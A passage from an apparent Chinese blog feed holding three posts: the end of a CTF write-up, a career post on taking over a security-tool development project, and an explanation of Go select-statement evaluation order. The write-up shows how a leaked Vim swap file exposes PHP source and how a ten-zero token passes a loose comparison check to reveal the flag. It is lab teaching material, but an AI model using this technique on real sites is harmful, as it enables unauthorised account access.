<h1 id="0x03-一般人查到这就懵逼了"><a href="#0x03-一般人查到这就懵逼了" class="headerlink" title="0x03 一般人查到这就懵逼了"></a>0x03 一般人查到这就懵逼了</h1><p>分析一下上述线索，只有 <strong>Vim 编辑器</strong> 这条线索没用到了，去查查用 Vim 时会产生什么文件吧，从<a href="https://segmentfault.com/q/1010000002692574">https://segmentfault.com/q/1010000002692574</a>可以看出有以下三种文件，逐一测试终于发现本题的关键文件 <code>.submit.php.swp</code>（注意 submit 前面还有个.）</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/shiyanbar-ctf-web-forgotten-password/vim.jpg" alt="vim"></p>
<p>打开 <code>.submit.php.swp</code> 文件，终于看到关键代码：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/shiyanbar-ctf-web-forgotten-password/swp.jpg" alt="swp"></p>
<p>要想输出 <code>$flag</code>，必须使三个 if 的条件成立：</p>
<ol>
<li><code>$emailAddress</code> 和 <code>$token</code> 非空</li>
<li><code>$token</code> 的长度为 10</li>
<li><code>$token</code> 的值为 0</li>
<li>最后注意 admin 的邮箱地址要填正确，否则 37 行 <code>$r[&#39;num&#39;]</code> 的查询返回结果为 0</li>
</ol>
<p>根据上述条件，就可构建出正确的参数值 <code>emailAddress=admin@simplexue.com&amp;token=0000000000</code>，提交后可见 flag：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/shiyanbar-ctf-web-forgotten-password/flag.jpg" alt="flag"></p>
]]></content>
      <categories>
        <category>InfoSec</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
        <tag>Audit</tag>
        <tag>PHP</tag>
        <tag>实验吧</tag>
        <tag>Vim</tag>
      </tags>
  </entry>
  <entry>
    <title>萌新开发接手大佬项目初体验</title>
    <url>/2020/05/23/record-of-newbie-developer-taking-over-project-for-colleague-quitting/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本人某司安全开发萌新一枚，入职以来主要负责自研 IDS（Intrusion Detection System，入侵检测系统）的管理台开发。在全栈开发老司机波老师的指导下，顺利完成了数据读写效率优化、数据可视化展示、安全运营能力提升等开发需求，对 Web 应用的整体架构有了更深理解。</p>
<p>不久前，突然接到项目交接任务，与领导与波老师开完项目交接会后，虽然没明说，但下意识能感觉到，波老师即将离开。接下的一周内，波老师要将几年来的开发成果塞进我的脑袋，最后总算是顺利完成交接。整个过程下来，感觉大脑许久未在紧迫高压的状态下，涌入如此大量的信息。</p>
<p>客观而言，接手他人工作虽然开头难，但能若成功接下来，则会让萌新以最快的速度成长。本文将以开发人员的视角，对<strong>接手项目过程中的要点</strong>进行总结，便于日后再出现工作交接时查漏补缺，同时也为尚未接手过工作的职场技术新人提供参考。</p>
<span id="more"></span>

<h1 id="0x01-交接要点"><a href="#0x01-交接要点" class="headerlink" title="0x01 交接要点"></a>0x01 交接要点</h1><p>工作交接最重要的原则，是<strong>双方高效的互动交流</strong>。不仅对技术开发者而言，对所有岗位都具有普适性，只靠单方促成的工作交接，可想而知会有多少缺漏。</p>
<p>下面我将作为接替者，从<strong>「他给我的」</strong>与<strong>「我问他的」</strong>两个互动过程进行展开，指出每个过程中需要注意的交接要点。在此之前，先列出一些工作交接过程中的基本原则：</p>
<ul>
<li>永远不要问对方离职原因（个人隐私）。</li>
<li>若离职者不主动说，在其离职前不要问跳槽去向。</li>
<li>可以询问离职时间，有助于工作交接的进度把控。</li>
<li>重点是<strong>收集离职者手上所有的公司资产信息</strong>，其次是<strong>掌握已上线项目的部署架构、具体功能、运营情况</strong>等，最后是<strong>了解项目实现的核心代码逻辑</strong>。</li>
</ul>
<h2 id="他给我的"><a href="#他给我的" class="headerlink" title="他给我的"></a>他给我的</h2><p>工作交接刚开始，波老师先将能想到的项目资产移交给我，让我对他几年来的工作有个宏观认识。接下来，将对这些项目资产进行归类，并分析交接要点。</p>
<h3 id="项目代码"><a href="#项目代码" class="headerlink" title="项目代码"></a>项目代码</h3><p>公司内部代码通常使用 GitLab 管理，我需要核对波老师移交项目的<strong>数目是否正确</strong>，确认项目代码的<strong>时效性与完整性</strong>，自身是否拥有项目的<strong>开发或管理权限</strong>等。</p>
<h3 id="项目文档"><a href="#项目文档" class="headerlink" title="项目文档"></a>项目文档</h3><p>项目文档可分为两类：一是项目开发过程中所用技术的<strong>外部文档</strong>，二是项目本身的<strong>内部文档</strong>。</p>
<p>第一类，主要是<strong>开发语言、开发框架、外部系统调用接口等文档</strong>，由其他相应开发者编写，适用范围相对广泛成熟，对代码层面上的细节与 FAQ 有详细记载，并能够定时更新。</p>
<p>第二类，主要是<strong>所接项目本身的说明文档</strong>，由项目开发者波老师编写，只对重点项目的部署架构进行说明，包括但不限于各模块的具体功能与部署机器 IP 列表，而对代码实现的描述较为欠缺。其中缘由，一是因为负责此项目的开发者人数有限，难以兼顾日益变化的代码与其说明文档；二是公司也没硬性要求对每个项目必须附属说明文档。</p>
<p>此处应注意，<strong>切勿过分依赖于项目文档，而忽视沟通交流在工作交接过程中的重要性</strong>。细想一下，开发者需要花大量时间攥写文档，接替者也要花大量时间去阅读理解，并且要求细节覆盖要到位，在工作交接时间紧迫的情况下是不切实际的。话又说回来，倘若平时严格执行开发规范，说明文档能够及时更新，每个项目至少有两位熟悉的开发者，那在交接过程中会大大降低工作量。</p>
<h3 id="系统架构"><a href="#系统架构" class="headerlink" title="系统架构"></a>系统架构</h3><p>首先，要熟悉公司内部所有 IDC 机房的部署情况与逻辑区域的划分规则，以及跨 IDC 机房或跨逻辑区域通信时的<strong>网络防火墙策略</strong>。接着，重点关注<strong>大型应用、分布式应用、数据库集群、网络负载均衡</strong>等系统部署架构，厘清各模块的具体功能与相互关系。</p>
<p>波老师通过在生产环境实地讲解，并手绘架构图，不仅能使我很快掌握项目部署架构，而且对公司内部的网络架构也有了更全面的理解。</p>
<h3 id="系统配置信息"><a href="#系统配置信息" class="headerlink" title="系统配置信息"></a>系统配置信息</h3><p>掌握了系统架构后，波老师将相关项目的系统配置信息列表给了我，其中包括：相关应用系统的<strong>部署地址、登录地址、登录方式、管理员账户密码、配置文件关键项、定时任务设定、启停脚本路径</strong>等，相关数据库集群的<strong>部署地址、连接方式、普通角色与管理员角色的账户密码</strong>等。</p>
<p>此外，波老师还传授了如何在生产环境找到特定信息的技巧，例如：</p>
<ul>
<li>通过 <code>crontab -l</code> 查看定时任务，可获取相关功能模块的绝对路径。</li>
<li>生产环境通常有保存 IP 列表的文件或查询 IP 列表的工具，可获取相关系统的部署地址。</li>
<li>查看应用系统配置文件，可获取其他对接应用系统的 API 地址、数据库连接地址、鉴权信息等。</li>
<li>查看 Nginx 配置文件，可了解相关应用系统的反向代理网络拓扑结构。</li>
</ul>
<h3 id="未完成工单"><a href="#未完成工单" class="headerlink" title="未完成工单"></a>未完成工单</h3><p>除了项目资产外，波老师还会把未能及时完成的工单转交给我，包括但不限于<strong>事件工单、安全工单、服务工单</strong>等。</p>
<p>首先，应厘清各个工单的详细内容及处理方法；其次，应尽快完成当前能够处理的工单；最后，应了解剩余工单暂时无法完成的原因，与相关同事保持沟通，必要时申请工单延期。</p>
<h2 id="我问他的"><a href="#我问他的" class="headerlink" title="我问他的"></a>我问他的</h2><p>工作交接进度过半，对波老师移交给我的项目资产有了大致认识。接下来，需要记录理解过程中的存疑，每天再约定好一个时段集中答疑，清空了存疑列表后，再记录新的问题，周而复始，不断完善自身对项目理解的逻辑链。最后要求达到的状态，是其他人对交接项目提出的问题，自己能够立刻解答。</p>
<h3 id="资产清单"><a href="#资产清单" class="headerlink" title="资产清单"></a>资产清单</h3><p>波老师移交的资产清单并非完整有序，因此我需要按照不同优先级重新整理资产清单，对尚不明确的地方做好标记，既能快速检验自己对所有资产的掌握情况，还能保证资产交接没有缺漏。</p>
<p>一级目录，根据<strong>相同功能模块的大类粗略区分</strong>，如入侵检测系统、漏洞扫描系统、Web 应用防火墙等。</p>
<p>二级目录，根据<strong>相同功能模块下的子类精细区分</strong>，如入侵检测系统的数据采集器、规则引擎、管理台等。</p>
<p>内容方面，简要概括每个<strong>子模块的功能</strong>，再分别记录生产环境与测试环境的<strong>部署地址</strong>。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">##### （1）入侵检测系统 #####</span><br><span class="line"></span><br><span class="line">1.1）采集器</span><br><span class="line">功能：系统进程、日志、网络流量采集？（有疑问，需确认）</span><br><span class="line">测试环境：各个服务器上</span><br><span class="line">生产环境：各个服务器上</span><br><span class="line"></span><br><span class="line">1.2）规则引擎</span><br><span class="line">功能：告警规则过滤、数据处理入库</span><br><span class="line">测试环境：a.a.a.a</span><br><span class="line">生产环境：？（有缺漏，需补齐）</span><br><span class="line"></span><br><span class="line">1.3）管理台</span><br><span class="line">功能：数据统计、可视化展示、漏洞运营</span><br><span class="line">测试环境：x.x.x.x</span><br><span class="line">生产环境：y.y.y.y</span><br><span class="line"></span><br><span class="line">1.4）...</span><br></pre></td></tr></table></figure>

<p>此外，还要留意<strong>日报邮件</strong>与<strong>告警邮件</strong>等特殊资产，其归类方法同上，只需对内容稍作修改：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">##### （2）安全日报邮件 #####</span><br><span class="line"></span><br><span class="line">2.1）新增漏洞日报</span><br><span class="line">功能：统计前一天新增的弱口令、风险组件、敏感信息泄露等漏洞</span><br><span class="line">上报方式：通过 xx.sh 脚本上报</span><br><span class="line">脚本路径：/data/script/path/xx.sh</span><br><span class="line">数据表名：new_vuls_report</span><br><span class="line"></span><br><span class="line">2.2）...</span><br><span class="line"></span><br><span class="line">##### （3）安全告警邮件 #####</span><br><span class="line"></span><br><span class="line">3.1）恶意文件告警</span><br><span class="line">功能：检测服务器上是否存在恶意文件</span><br><span class="line">检测方式：通过入侵检测系统的规则引擎</span><br><span class="line"></span><br><span class="line">3.2）...</span><br></pre></td></tr></table></figure>

<p>资产清单的列举可参考上述方式，按照实际需求再作调整。清单全部列举完后，需要找离职者确认一遍，将模糊之处厘清，将缺漏之处补齐。</p>
<h3 id="对接关系"><a href="#对接关系" class="headerlink" title="对接关系"></a>对接关系</h3><p>除了实际项目资产外，波老师原有的对接关系也是一项重要的隐形资产。</p>
<p>对接关系是指在项目开展过程中，与其他同事建立起的必要工作关系，这些同事包括但不限于<strong>资源申请联系人、关联子系统负责人、权限审核人员、系统运维人员</strong>等，以实际场景举例：</p>
<ul>
<li>测试环境机器申请，需联系资源管理员 A。</li>
<li>生产环境网络策略不通，需联系策略管理员 B。</li>
<li>数据库扩容，需联系数据库管理员 C。</li>
<li>某编程框架的使用问题，可咨询开发专家 D。</li>
</ul>
<p>与项目相关的对接关系复杂多样，通常只留存于离职者的工作聊天记录或大脑记忆中，而未被针对性地记录整理。因此，接替者应考虑各种可能出现的场景，当相应问题出现时应该与谁对接。否则，当你问了一圈都还未能找到对接人时，则会因为工作时间被白白消耗而感到抓狂。</p>
<p>整理好未知的对接关系后，一定要与离职者确认补齐，因为厘清这些关系后，对后续项目开展会有事半功倍的效果。</p>
<h3 id="鉴权主体变更"><a href="#鉴权主体变更" class="headerlink" title="鉴权主体变更"></a>鉴权主体变更</h3><p>项目开发过程中，或多或少会与公司内部其他子系统建立联系，需要调用 API 接口获取其他子系统的内部信息。在此之前，需要向相关子系统负责人申请 API 接口访问权限，而这些权限通常是以开发者波老师的名义申请的。</p>
<p>因此，我们需要<strong>整理以离职者名义申请的访问权限，并与相关负责人确认这些权限日后是否会失效</strong>。若会失效，则需要接替者重新申请访问权限，完成鉴权主体变更。</p>
<h3 id="收信主体变更"><a href="#收信主体变更" class="headerlink" title="收信主体变更"></a>收信主体变更</h3><p>项目运营过程中，开发者会设置<strong>与运营情况相关的日报或告警提醒功能</strong>。为避免波老师离任后导致系统监控缺失，我需要将日报或告警的提醒功能重置为自己的。</p>
<p>鉴于日报或告警的种类繁多，接替者需要与离职者确认每种<strong>日报的上报方式</strong>，或每种<strong>告警的触发方式</strong>，并完成收信主体的变更设置。</p>
<h3 id="需求开发指点"><a href="#需求开发指点" class="headerlink" title="需求开发指点"></a>需求开发指点</h3><p>项目交接后，我可能需要继续完成波老师正在开发的需求。由于刚刚接手的项目开发，我需要花费较多时间去理解代码，而波老师能够<strong>对当前或排期中的需求，给出合理的指导建议或实施方案</strong>，这有助于我快速过渡磨合期。</p>
<p>接替者需要<strong>重点关注自己不熟悉的开发领域</strong>，根据需求优先级向离职者寻求建议，例如：</p>
<ul>
<li>为了监控程序的 IO 与 网络连接资源占用情况，可以用什么技术或哪个工具库实现？</li>
<li>如何根据服务器的 CPU 架构类型下发不同版本的程序？</li>
<li>此 SpringMVC  项目在 IntelliJ IDEA 的开发环境配置上需要注意什么？</li>
</ul>
<h3 id="问题解决方法"><a href="#问题解决方法" class="headerlink" title="问题解决方法"></a>问题解决方法</h3><p>项目在开发或运营过程中，难免会出现各种问题，而波老师往往对自己项目可能出现的问题了如指掌，能够<strong>对常见问题给出解决方法作为指导</strong>，同样有助于我在磨合期内少踩坑。</p>
<p>接替者需要<strong>重点关注核心项目的常见问题及解决方法</strong>，例如：</p>
<ul>
<li>IDS 常见告警的确认方法？</li>
<li>IDS 安装包下发失败的常见原因及解决方法？</li>
<li>数据库出现慢查询的常见原因及解决方法？</li>
</ul>
<p>对于常见问题，通常有具体的解决方法，但若出现无法预料的问题，或某个问题可能由多种原因导致，则需要<strong>掌握问题排查思路，具体问题具体分析</strong>，例如：</p>
<ul>
<li>IDS 后端服务器重启可能原因及排查思路？</li>
<li>IDS 采集客户端离线的可能原因及排查思路？</li>
</ul>
<h3 id="细枝末节"><a href="#细枝末节" class="headerlink" title="细枝末节"></a>细枝末节</h3><p>除了上述需要接替者重点关注的问题外，可能还有些细枝末节的问题，需要根据自身情况总结整理，在此暂不归类，包括但不限于<strong>管理归属确认、日常操作技巧、流程操作步骤</strong>等，例如：</p>
<ul>
<li>某系统的开发或运营我需要关注吗？</li>
<li>IDS 采集客户端的开发调试技巧？</li>
<li>如何快速统计日志文件中特定字段出现的次数？</li>
<li>新环境部署 IDS 的操作流程？</li>
<li>新版本发布时的操作流程？</li>
</ul>
<h1 id="0x02-写在最后"><a href="#0x02-写在最后" class="headerlink" title="0x02 写在最后"></a>0x02 写在最后</h1><p>在时间洪流的推动下，交接工作不知不觉已基本完成。在某个平常的工作日，波老师收拾完工位后便悄咪咪地离开了，当时还在操作间奋战的我也没来得及跟他道别。得知波老师是去北京追求爱情时，能做的只有在微信群送上最后的祝福：祝波老师北漂之旅幸福美满！</p>
<p>最后，由衷感谢波老师对我项目开发的指导，道阻且长，行则将至，属于自己的战斗才刚刚打响…</p>
]]></content>
      <categories>
        <category>Tips</category>
        <category>Career</category>
      </categories>
      <tags>
        <tag>Career</tag>
        <tag>Guideline</tag>
      </tags>
  </entry>
  <entry>
    <title>浅析 Go select 语句的执行顺序问题</title>
    <url>/2022/11/09/simply-analyse-the-execution-order-of-select-statement-in-golang/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Go 语言中的 select 语句，用于控制 channel 的通信操作，分为<a href="https://go.dev/ref/spec#Send_statements">发送操作</a>与<a href="https://go.dev/ref/spec#Receive_operator">接收操作</a>两类。</p>
<p>众所周知，大多数教程只是大致描述了 select 语句的执行流程：当 case 中存在一个或多个可执行的通信操作时，会随机选择进入其中一个，并完成该 case 下的相应语句。当不存在可执行的通道操作时，会先判断是否存在 default case，有则进入，无则阻塞，直至通信操作可执行。</p>
<p>然而，对 case 中表达式的执行顺序，却少有解释。接下来，本文<strong>将根据官方对 select 语句的定义说明，重点阐述 case 中表达式的执行顺序问题</strong>，并给出样例辅助理解，最后对整体执行流程做出总结。</p>
<span id="more"></span>

<h1 id="0x01-select-语句官方说明"><a href="#0x01-select-语句官方说明" class="headerlink" title="0x01 select 语句官方说明"></a>0x01 select 语句官方说明</h1><p>Go 语言对 select 语句的官方说明，对于初学者而言难免晦涩难懂。为了帮助读者更好地理解，本章先对官方说明进行中英对译，再重点阐述 case 中表达式的执行顺序问题。</p>
<h2 id="中英对译"><a href="#中英对译" class="headerlink" title="中英对译"></a>中英对译</h2><p><strong>Select statements</strong></p>
<p><strong>Select 语句</strong></p>
<p>A “select” statement chooses which of a set of possible <a href="https://go.dev/ref/spec#Send_statements">send</a> or <a href="https://go.dev/ref/spec#Receive_operator">receive</a> operations will proceed. It looks similar to a <a href="https://go.dev/ref/spec#Switch_statements">“switch”</a> statement but with the cases all referring to communication operations.</p>
<p>select 语句用于从一组<a href="https://go.dev/ref/spec#Send_statements">发送操作</a>或<a href="https://go.dev/ref/spec#Receive_operator">接收操作</a>中，选出一个可执行的操作。这有点像 <a href="https://go.dev/ref/spec#Switch_statements">switch</a> 语句，只不过 case 都换成了与通信相关的操作而已。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">SelectStmt = <span class="string">&quot;select&quot;</span> <span class="string">&quot;&#123;&quot;</span> &#123; CommClause &#125; <span class="string">&quot;&#125;&quot;</span> .</span><br><span class="line">CommClause = CommCase <span class="string">&quot;:&quot;</span> StatementList .</span><br><span class="line">CommCase   = <span class="string">&quot;case&quot;</span> ( SendStmt | RecvStmt ) | <span class="string">&quot;default&quot;</span> .</span><br><span class="line">RecvStmt   = [ ExpressionList <span class="string">&quot;=&quot;</span> | IdentifierList <span class="string">&quot;:=&quot;</span> ] RecvExpr .</span><br><span class="line">RecvExpr   = Expression .</span><br></pre></td></tr></table></figure>

<blockquote>
<p>译者注：这是一种名为 <a href="https://en.wikipedia.org/wiki/Wirth_syntax_notation">Wirth syntax notation (WSN)</a> 的元语法标记，用于正式定义与描述 select 语句。考虑到上述标记在官方文档中均能找到定义，具有唯一性，因此后文不进行翻译。</p>
</blockquote>
<p>A case with a RecvStmt may assign the result of a RecvExpr to one or two variables, which may be declared using a <a href="https://go.dev/ref/spec#Short_variable_declarations">short variable declaration</a>. The RecvExpr must be a (possibly parenthesized) receive operation. There can be at most one default case and it may appear anywhere in the list of cases.</p>
<p>case 中的 RecvStmt 可将 RecvExpr 的结果赋值给一个或两个变量，同时也支持<a href="https://go.dev/ref/spec#Short_variable_declarations">短变量声明</a>。其中，RecvExpr 表达式（可能被括号括起）必须为接收操作。另外，可以在多个 case 之间的任何位置，添加至多一个 default case。</p>
<p>Execution of a “select” statement proceeds in several steps:</p>
<ol>
<li><p>For all the cases in the statement, <strong>the channel operands of receive operations</strong> and <strong>the channel and right-hand-side expressions of send statements</strong> are evaluated exactly once, in source order, upon entering the “select” statement. The result is a set of channels to receive from or send to, and the corresponding values to send. Any side effects in that evaluation will occur irrespective of which (if any) communication operation is selected to proceed. Expressions on the left-hand side of a RecvStmt with a short variable declaration or assignment are not yet evaluated.</p>
</li>
<li><p>If one or more of the communications can proceed, a single one that can proceed is chosen via a uniform pseudo-random selection. Otherwise, if there is a default case, that case is chosen. If there is no default case, the “select” statement blocks until at least one of the communications can proceed.</p>
</li>
<li><p>Unless the selected case is the default case, the respective communication operation is executed.</p>
</li>
<li><p>If the selected case is a RecvStmt with a short variable declaration or an assignment, <strong>the left-hand side expressions</strong> are evaluated and <strong>the received value (or values)</strong> are assigned.</p>
</li>
<li><p>The statement list of the selected case is executed.</p>
</li>
</ol>
<p>select 语句的执行流程有以下步骤：</p>
<ol>
<li>在真正进入 select 语句之前，会按照源代码的编写顺序，检视所有 case 中的表达式，并对其中<strong>接收操作的通道操作数</strong>，以及<strong>发送语句中的通道与右值表达式</strong>进行一次求值，其结果将作为接收或发送操作的通道，以及相应待发送的值。上述求值过程可能会出现意想不到的副作用，并且与哪一个通信操作被选择执行了（如果有的话）无关。注意，此时 RecvStmt 中的短变量声明或变量赋值语句，其左值表达式尚未进行求值。</li>
<li>若存在一个或多个可执行的通信操作，则其中一个会被统一的伪随机算法选择执行。否则，若存在一个 default case，则会选择执行；若不存在 default case，select 语句会一直阻塞到至少存在一个可执行的通信操作为止。</li>
<li>执行所选 case 中相应的通信操作，而 default case 不涉及。</li>
<li>如果所选的 case 是短变量声明或变量赋值的 RecvStmt，则会对其<strong>左值表达式</strong>进行求值，并把<strong>接收到的值</strong>赋给它。</li>
<li>最后依次执行所选 case 下的所有语句。</li>
</ol>
<p>Since communication on <code>nil</code> channels can never proceed, a select with only <code>nil</code> channels and no default case blocks forever.</p>
<p>由于 <code>nil</code> 通道无法执行通信操作，因此只有 <code>nil</code> 通道且不存在 default case 的 select 语句将永远阻塞。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a []<span class="type">int</span></span><br><span class="line"><span class="keyword">var</span> c, c1, c2, c3, c4 <span class="keyword">chan</span> <span class="type">int</span></span><br><span class="line"><span class="keyword">var</span> i1, i2 <span class="type">int</span></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> i1 = &lt;-c1:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;received &quot;</span>, i1, <span class="string">&quot; from c1\n&quot;</span>)</span><br><span class="line"><span class="keyword">case</span> c2 &lt;- i2:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;sent &quot;</span>, i2, <span class="string">&quot; to c2\n&quot;</span>)</span><br><span class="line"><span class="keyword">case</span> i3, ok := (&lt;-c3):  <span class="comment">// same as: i3, ok := &lt;-c3</span></span><br><span class="line">	<span class="keyword">if</span> ok &#123;</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;received &quot;</span>, i3, <span class="string">&quot; from c3\n&quot;</span>)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;c3 is closed\n&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">case</span> a[f()] = &lt;-c4:</span><br><span class="line">	<span class="comment">// same as:</span></span><br><span class="line">	<span class="comment">// case t := &lt;-c4</span></span><br><span class="line">	<span class="comment">//	a[f()] = t</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;no communication\n&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;  <span class="comment">// send random sequence of bits to c</span></span><br><span class="line">	<span class="keyword">select</span> &#123;</span><br><span class="line">	<span class="keyword">case</span> c &lt;- <span class="number">0</span>:  <span class="comment">// note: no statement, no fallthrough, no folding of cases</span></span><br><span class="line">	<span class="keyword">case</span> c &lt;- <span class="number">1</span>:</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;&#125;  <span class="comment">// block forever</span></span><br></pre></td></tr></table></figure>

<h2 id="流程解析"><a href="#流程解析" class="headerlink" title="流程解析"></a>流程解析</h2><p>接下来，重点关注上述 select 语句的执行流程。</p>
<p>开发者通常遇到的场景，只要理解了流程中的第 2、3、5 步，即可编写出所需逻辑，这也是开头所说的，大多数教程对 select 语句执行流程的大致描述。</p>
<p>随着接触到的业务场景日益渐增，不可避免地需要编写复杂的代码逻辑，这要求 select 语句与其他表达式或数据类型结合使用，而不只是通道的直接发送或接收那么简单。<strong>因此，能正确理解流程中的第 1、4 步，是完全掌握 select 语句用法的前提。</strong></p>
<p>为了更直观地理解第 1、4 步的含义，专门绘制以下对应关系图：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/simply-analyse-the-execution-order-of-select-statement-in-golang/step1-in-select-case.png" alt="step1-in-select-case"></p>
<ul>
<li>接收操作：<code>recv_ch</code> 是通道操作数，可为接收通道，或输出结果为接收通道的表达式。</li>
<li>发送操作：<code>send_ch</code> 是发送通道，或输出结果为发送通道的表达式；而 <code>expression</code> 是右值表达式，其值将会被发送至 <code>send_ch</code> 通道中。</li>
</ul>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/simply-analyse-the-execution-order-of-select-statement-in-golang/step4-in-select-case.png" alt="step4-in-select-case"></p>
<ul>
<li>接收操作：<code>&lt;-recv_ch</code> 是从接收通道中获取的值，将赋值给左值表达式 <code>a[f()]</code>，此处 <code>a</code> 为 map 或 slice 类型的变量，因此需对 <code>f()</code> 进行求值以获取相应元素。注意，左值表达式可能为 int 或 string 等基本类型变量，也可能不存在，即赋值不是必须的。</li>
</ul>
<h1 id="0x02-样例验证"><a href="#0x02-样例验证" class="headerlink" title="0x02 样例验证"></a>0x02 样例验证</h1><p>介绍完 select 语句的官方说明后，相信大家对它的整体执行流程有了一定理解。接下来，将用几个样例重点验证第 1、4 步流程，以助于巩固加强。</p>
<h2 id="样例一：矩步方行"><a href="#样例一：矩步方行" class="headerlink" title="样例一：矩步方行"></a>样例一：矩步方行</h2><p>本样例的 select 语句构造了三个函数与三个 case，通过打印日志的方法以窥探其执行顺序：</p>
<ul>
<li>case 1：接收操作，从 <code>getIntChan()</code> 返回的无缓冲通道中，接收 int 类型数值并赋值给 <code>intArr[getInt(0)]</code> 元素，注意此处是通过 <code>getInt(0)</code> 来获取 <code>intArr</code> 的第一个元素。</li>
<li>case 2：发送操作，将 <code>getInt(1)</code> 的求值结果，发送至 <code>getIntBufChan()</code> 返回的有缓冲通道中。</li>
<li>default case：默认操作，只打印日志。</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	intChan    = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line">	intBufChan = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">2</span>)</span><br><span class="line">	intArr     = <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">2</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		intChan &lt;- <span class="number">0</span></span><br><span class="line">	&#125;()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">select</span> &#123;</span><br><span class="line">	<span class="keyword">case</span> intArr[getInt(<span class="number">0</span>)] = &lt;-getIntChan():</span><br><span class="line">		fmt.Printf(<span class="string">&quot;select case 1\n&quot;</span>)</span><br><span class="line">	<span class="keyword">case</span> getIntBufChan() &lt;- getInt(<span class="number">1</span>):</span><br><span class="line">		fmt.Printf(<span class="string">&quot;select case 2\n&quot;</span>)</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		fmt.Printf(<span class="string">&quot;select default case\n&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getInt</span><span class="params">(i <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;get int %d\n&quot;</span>, i)</span><br><span class="line">	<span class="keyword">return</span> i</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getIntChan</span><span class="params">()</span></span> <span class="keyword">chan</span> <span class="type">int</span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;get int chan\n&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> intChan</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getIntBufChan</span><span class="params">()</span></span> <span class="keyword">chan</span> <span class="type">int</span> &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;get int buf chan\n&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> intBufChan</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多次运行后，发现只有以下两种结果，而 default case 永远不会进入。</p>
<p>第一种结果选择 case 1，执行顺序为：<code>getIntChan()</code> → <code>getIntBufChan()</code> → <code>getInt(1)</code> → <code>getInt(0)</code> → <code>intArr[getInt(0)]</code> → <code>fmt.Printf(&quot;select case 1\n&quot;)</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">get <span class="type">int</span> <span class="keyword">chan</span></span><br><span class="line">get <span class="type">int</span> buf <span class="keyword">chan</span></span><br><span class="line">get <span class="type">int</span> <span class="number">1</span></span><br><span class="line">get <span class="type">int</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>第二种结果选择 case 2，执行顺序为：<code>getIntChan()</code> → <code>getIntBufChan()</code> → <code>getInt(1)</code> → <code>fmt.Printf(&quot;select case 2\n&quot;)</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">get <span class="type">int</span> <span class="keyword">chan</span></span><br><span class="line">get <span class="type">int</span> buf <span class="keyword">chan</span></span><br><span class="line">get <span class="type">int</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>综上结果，与官方说明一致：执行流程第 1 步，先按代码编写顺序，分别对 <code>getIntChan()</code>、<code>getIntBufChan()</code>、<code>getInt(1)</code> 进行求值；执行流程第 4 步，若选择 case 1 的接收操作，则会对 <code>getInt(0)</code> 求值后进行赋值，否则 <code>getInt(0)</code> 不会执行。</p>
